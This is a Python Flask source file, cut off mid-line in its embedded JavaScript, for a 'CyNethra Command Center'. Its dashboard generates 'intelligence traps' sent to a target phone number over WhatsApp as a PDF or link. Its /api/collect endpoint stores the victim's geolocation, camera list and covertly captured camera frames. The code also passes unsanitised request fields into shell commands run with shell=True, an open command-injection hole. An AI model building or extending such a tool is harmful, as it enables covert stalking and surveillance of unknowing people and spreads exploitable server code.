# -*- coding: utf-8 -*-
import os
import json
import base64
import logging
import subprocess
from datetime import datetime
from flask import Flask, request, jsonify, send_from_directory, render_template_string
import uuid

# ==============================================================================
# CONFIGURATION
# ==============================================================================
BASE_DIR = "/root/CyNethra"
DATABASE_DIR = f"{BASE_DIR}/Database/traps"
MEDIA_DIR = f"{BASE_DIR}/reports/media"
PDF_DIR = f"{BASE_DIR}/pdf_output"
LOG_FILE = f"{BASE_DIR}/cynethra.log"

# Ensure directories exist
for dir_path in [DATABASE_DIR, MEDIA_DIR, PDF_DIR]:
    os.makedirs(dir_path, exist_ok=True)

# Logging configuration
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("CyNethra")

app = Flask(__name__)

# ==============================================================================
# HELPER FUNCTIONS
# ==============================================================================
def run_vps_command(command):
    """Execute a command on the VPS and return output."""
    try:
        result = subprocess.run(
            command, 
            shell=True, 
            capture_output=True, 
            text=True, 
            timeout=30
        )
        return {
            "stdout": result.stdout,
            "stderr": result.stderr,
            "returncode": result.returncode
        }
    except Exception as e:
        return {"error": str(e)}

def get_recent_logs(lines=50):
    """Fetch recent logs from journalctl."""
    cmd = f"journalctl -u cynethra.service -n {lines} --no-pager"
    result = run_vps_command(cmd)
    return result.get("stdout", "")

def get_service_status():
    """Check service status."""
    cmd = "systemctl status cynethra.service --no-pager -l"
    result = run_vps_command(cmd)
    return result.get("stdout", "")

# ==============================================================================
# ROUTES: GUI INTERFACE
# ==============================================================================
@app.route('/')
def index():
    """Serve the main GUI Dashboard."""
    return render_template_string(GUI_HTML)

# ==============================================================================
# ROUTES: API ACTIONS
# ==============================================================================
@app.route('/api/deploy', methods=['POST'])
def api_deploy():
    """Trigger deployment of scripts."""
    # This assumes scripts are already in the repo, but in a real scenario,
    # you might pull from git here. For now, we restart the service.
    cmd = "cd /root/CyNethra && git pull && systemctl restart cynethra.service"
    result = run_vps_command(cmd)
    return jsonify(result)

@app.route('/api/trap', methods=['POST'])
def api_create_trap():
    """Create a new trap via the GUI."""
    data = request.json
    target = data.get('target')
    delivery = data.get('delivery', 'pdf')
    url = data.get('url')
    
    # Build the command to run the control script
    cmd_parts = [
        f"cd {BASE_DIR} && {BASE_DIR}/venv/bin/python -c \""
        f"import sys; sys.path.append('scripts'); import cynethra_honeytrap as h; "
        f"config = h.get_advanced_config('{target}', 'whatsapp', 'auto', '{url}', '{delivery}'); "
        f"res = h.create_trap('{target}', 'whatsapp', 'auto', target_url='{url}', config=config, delivery='{delivery}'); "
        f"import json; print(json.dumps(res))\""
    ]
    
    cmd = " ".join(cmd_parts)
    result = run_vps_command(cmd)
    
    try:
        # The python script outputs JSON
        output_json = json.loads(result['stdout'])
        return jsonify(output_json)
    except:
        return jsonify({"error": result['stderr'] or result['stdout']})

@app.route('/api/logs', methods=['GET'])
def api_logs():
    """Get recent logs."""
    lines = request.args.get('lines', 50)
    logs = get_recent_logs(lines)
    return jsonify({"logs": logs})

@app.route('/api/status', methods=['GET'])
def api_status():
    """Get service status."""
    status = get_service_status()
    return jsonify({"status": status})

@app.route('/api/collect', methods=['POST'])
def collect_data():
    """
    Receives the intelligence payload from the target's browser.
    """
    try:
        trap_id = request.args.get('trap_id')
        data = request.json
        
        if not trap_id or not data:
            return jsonify({"error": "Invalid request"}), 400
        
        logger.info(f"[INGEST] Data received for trap {trap_id} from {request.remote_addr}")
        
        # 1. Save Metadata
        meta_path = os.path.join(MEDIA_DIR, f"{trap_id}_meta.json")
        with open(meta_path, 'w') as f:
            json.dump(data, f, indent=2)
        
        # 2. Save Media Frames (if any)
        frames_dir = os.path.join(MEDIA_DIR, f"{trap_id}_frames")
        os.makedirs(frames_dir, exist_ok=True)
        
        frames = data.get('media', {}).get('frames', [])
        for i, frame in enumerate(frames):
            if frame.startswith('data:image'):
                base64_data = frame.split(',')[1]
                frame_path = os.path.join(frames_dir, f"frame_{i}.jpg")
                with open(frame_path, 'wb') as f:
                    f.write(base64.b64decode(base64_data))
        
        # 3. Log Summary
        location = data.get('location', {})
        if location:
            logger.info(f"[GEO] Lat: {location.get('latitude')}, Lng: {location.get('longitude')}")
        
        cameras = data.get('media', {}).get('cameras', [])
        logger.info(f"[MEDIA] {len(cameras)} cameras detected, {len(frames)} frames captured")
        
        return jsonify({"status": "success", "id": trap_id})
        
    except Exception as e:
        logger.error(f"[ERROR] Ingestion failed: {e}")
        return jsonify({"error": str(e)}), 500

@app.route('/api/collect?trap_id=<trap_id>', methods=['GET'])
def view_trap_data(trap_id):
    """Serve raw JSON for a specific trap."""
    meta_path = os.path.join(MEDIA_DIR, f"{trap_id}_meta.json")
    if not os.path.exists(meta_path):
        return jsonify({"error": "Trap not found"}), 404
    
    with open(meta_path, 'r') as f:
        data = json.load(f)
    
    frames_dir = os.path.join(MEDIA_DIR, f"{trap_id}_frames")
    if os.path.exists(frames_dir):
        frames = [f for f in os.listdir(frames_dir) if f.endswith('.jpg')]
        data['media']['frame_urls'] = [f"/media/{trap_id}_frames/{frame}" for frame in frames]
    
    return jsonify(data)

@app.route('/media/<path:filename>')
def serve_media(filename):
    return send_from_directory(MEDIA_DIR, filename)

# ==============================================================================
# GUI HTML TEMPLATE
# ==============================================================================
GUI_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CyNethra Command Center</title>
    <style>
        :root {
            --bg-dark: #0f172a;
            --bg-card: #1e293b;
            --accent: #38bdf8;
            --accent-hover: #0ea5e9;
            --text-main: #f8fafc;
            --text-muted: #94a3b8;
            --success: #10b981;
            --error: #ef4444;
            --border: #334155;
        }
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: var(--bg-dark);
            color: var(--text-main);
            padding: 20px;
        }
        .container { max-width: 1400px; margin: 0 auto; }
        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
            padding-bottom: 20px;
            border-bottom: 1px solid var(--border);
        }
        h1 {
            font-size: 24px;
            color: var(--accent);
            font-weight: 600;
        }
        .status-badge {
            padding: 5px 15px;
            background-color: var(--bg-card);
            border-radius: 20px;
            font-size: 14px;
            border: 1px solid var(--border);
        }
        .grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
        }
        @media (max-width: 900px) { .grid { grid-template-columns: 1fr; } }
        .card {
            background-color: var(--bg-card);
            border-radius: 8px;
            padding: 20px;
            border: 1px solid var(--border);
        }
        .card h2 {
            font-size: 18px;
            margin-bottom: 15px;
            color: var(--accent);
            border-bottom: 1px solid var(--border);
            padding-bottom: 10px;
        }
        .form-group { margin-bottom: 15px; }
        label { display: block; margin-bottom: 5px; font-size: 14px; color: var(--text-muted); }
        input, select {
            width: 100%;
            padding: 10px;
            background-color: var(--bg-dark);
            border: 1px solid var(--border);
            color: var(--text-main);
            border-radius: 4px;
        }
        button {
            background-color: var(--accent);
            color: var(--bg-dark);
            border: none;
            padding: 10px 20px;
            border-radius: 4px;
            font-weight: bold;
            cursor: pointer;
            transition: background 0.3s;
            width: 100%;
            margin-top: 10px;
        }
        button:hover { background-color: var(--accent-hover); }
        .log-area {
            background-color: #000;
            color: #0f0;
            font-family: monospace;
            font-size: 12px;
            height: 300px;
            overflow-y: auto;
            padding: 10px;
            border-radius: 4px;
            border: 1px solid var(--border);
            white-space: pre-wrap;
        }
        .trap-result {
            background-color: var(--bg-dark);
            padding: 15px;
            border-radius: 4px;
            margin-top: 15px;
            font-family: monospace;
            word-break: break-all;
            display: none;
        }
        .table-container { overflow-x: auto; }
        table { width: 100%; border-collapse: collapse; font-size: 14px; }
        th, td { padding: 10px; text-align: left; border-bottom: 1px solid var(--border); }
        th { background-color: var(--bg-dark); color: var(--text-muted); }
        .badge {
            display: inline-block;
            padding: 2px 8px;
            border-radius: 4px;
            font-size: 12px;
        }
        .badge-success { background-color: var(--success); color: white; }
        .badge-warning { background-color: #f59e0b; color: white; }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🕸️ CyNethra Command Center</h1>
            <div class="status-badge" id="service-status">Checking Status...</div>
        </header>

        <div class="grid">
            <!-- Left Column: Controls -->
            <div>
                <div class="card">
                    <h2>🚀 Deploy & Restart</h2>
                    <p style="color: var(--text-muted); margin-bottom: 10px;">Pull latest code and restart the service.</p>
                    <button onclick="deploy()">Deploy Updates</button>
                    <div id="deploy-result" class="trap-result"></div>
                </div>

                <div class="card" style="margin-top: 20px;">
                    <h2>🎯 Create Intelligence Trap</h2>
                    <div class="form-group">
                        <label>Target Number</label>
                        <input type="text" id="target-num" placeholder="917997187999">
                    </div>
                    <div class="form-group">
                        <label>Delivery Method</label>
                        <select id="delivery-method">
                            <option value="pdf">PDF Document</option>
                            <option value="url">Web Link</option>
                        </select>
                    </div>
                    <div class="form-group">
                        <label>Redirect URL (Optional)</label>
                        <input type="text" id="redirect-url" placeholder="https://youtube.com/shorts/...">
                    </div>
                    <button onclick="createTrap()">Generate Trap</button>
                    <div id="trap-result" class="trap-result"></div>
                </div>
            </div>

            <!-- Right Column: Monitoring -->
            <div>
                <div class="card">
                    <h2>📊 Recent Collections</h2>
                    <div class="table-container">
                        <table id="traps-table">
                            <thead>
                                <tr>
                                    <th>Time</th>
                                    <th>Trap ID</th>
                                    <th>Location</th>
                                    <th>Frames</th>
                                    <th>Action</th>
                                </tr>
                            </thead>
                            <tbody id="traps-tbody">
                                <tr><td colspan="5">Loading...</td></tr>
                            </tbody>
                        </table>
                    </div>
                </div>

                <div class="card" style="margin-top: 20px;">
                    <h2>📜 Live Logs</h2>
                    <div class="log-area" id="log-area">Waiting for logs...</div>
                    <button onclick="refreshLogs()">Refresh Logs</button>
                </div>
            </div>
        </div>
    </div>

    <script>
        // API Helper
        async function apiCall(endpoint, method = 'GET', data = null) {
            const options = {
                method: method,
                headers: { 'Content-Type': 'application/json' }
            };
            if (data) options.body = JSON.stringify(data);
            const response = await fetch(endpoint, options);
            return response.json();
        }

        // Load Status
        async function loadStatus() {
            const data = await apiCall('/api/status');
            const statusEl = document.getElementById('service-status');
            if (data.status.includes('active')) {
                statusEl.textContent = '● Service Active';
                statusEl.style.color = 'var(--success)';
            } else {
                statusEl.textContent = '● Service Inactive';
                statusEl.style.color = 'var(--error)';
            }
        }

        // Deploy
        async function deploy() {
            const btn = document.querySelector('button[onclick="deploy()"]');
            btn.textContent = 'Deploying...';
            btn.disabled = true;
            
            const data = await apiCall('/api/deploy', 'POST');
            
            const resultDiv = document.getElementById('deploy-result');
            resultDiv.style.display = 'block';
            resultDiv.textContent = data.stdout || data.stderr || data.error;
            
            btn.textContent =
